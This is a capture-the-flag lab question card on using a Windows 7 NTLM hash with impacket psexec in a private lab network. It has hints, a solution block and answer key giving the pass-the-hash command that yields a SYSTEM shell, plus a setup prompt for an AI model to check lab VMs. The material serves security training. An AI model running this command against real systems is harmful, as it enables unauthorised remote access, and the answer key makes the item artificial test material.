# Q064 — Pass-the-Hash with psexec

| Field | Value |
|---|---|
| **Target** | `192.168.52.130` (Windows 7) |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
| **Time budget** | 15–25 min |

---

## 📝 Question

With Win7 NTLM hash from hashdump, use impacket `psexec.py` to authenticate. Provide command syntax (placeholder hash).

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=psexec.py -hashes :ntlmhash Administrator@192.168.52.130`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Empty LM portion: `:`.
</details>

<details>
<summary>Hint 2</summary>

Requires SMB ports open.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
impacket-psexec -hashes :<NThash> Administrator@192.168.52.130
```

Drops SYSTEM shell on Win7.

**Answer:** `cmd=psexec.py -hashes :NTHASH Administrator@192.168.52.130`

📖 Ref: [tools/impacket.md](../../tools/impacket.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q064".
```
